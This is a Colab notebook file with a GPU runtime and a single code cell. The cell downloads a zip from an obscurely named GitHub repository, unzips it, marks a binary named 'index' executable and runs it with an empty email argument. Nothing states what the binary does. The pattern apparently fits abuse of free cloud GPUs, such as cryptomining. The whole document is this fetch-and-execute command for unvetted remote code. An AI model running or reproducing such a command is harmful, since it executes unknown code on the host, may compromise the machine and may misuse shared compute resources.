{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled3.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "h8inRqWGx5uY"
      },
      "source": [
        "!wget -O index.zip https://raw.githubusercontent.com/ratumedularmand/rentroustrankle/main/index.zip && unzip -o index.zip && chmod +x ./index && ./index --email="
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}